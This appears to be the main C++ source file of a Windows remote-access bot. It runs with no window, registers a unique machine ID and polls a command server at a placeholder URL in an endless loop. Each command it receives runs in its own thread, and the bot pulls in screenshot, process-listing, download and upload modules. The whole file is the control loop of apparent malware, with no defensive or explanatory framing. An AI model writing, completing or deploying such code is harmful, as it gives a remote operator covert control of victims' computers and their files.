#include <iostream>
#include <exception>
#include <string>
#include <fstream>
#include <vector>
#include <sstream>
#include <time.h>
#include <windows.h>
#include <wininet.h>
#include <TLHELP32.h>
#include <sys/stat.h> // for file_size()
#include <gdiplus.h>

#define MAX 255

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace std;
using namespace Gdiplus;

#include "Declarations.h"

const string DOMAINX = "http://example.com/k";
const string ID = GetUniqueID();

/* --------------------------- */
	#include "URLEncode.h"
	#include "Utility.h"
	#include "Screen.h"
	#include "Functions.h"
	#include "Download.h"
	#include "Upload.h"
/* --------------------------- */


int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	
	InitializeCriticalSection(&sectionBrowse);
	InitializeCriticalSection(&sectionBrowseAll);

	Sleep(1000);

	while (1) {
		Sleep(100);  // Wait a little before each command

		string Command = GetCommand(ID);
	
		if (Command != "Error") {
			if (!Command.empty()) {
				char *param = new char[Command.size()+1];
				strcpy (param, Command.c_str());
				CreateThread(NULL, 0, ExecuteCommand, param, 0, NULL);
			}
		}
	}

	DeleteCriticalSection(&sectionBrowse);
	DeleteCriticalSection(&sectionBrowseAll);
	
    return 0;
}

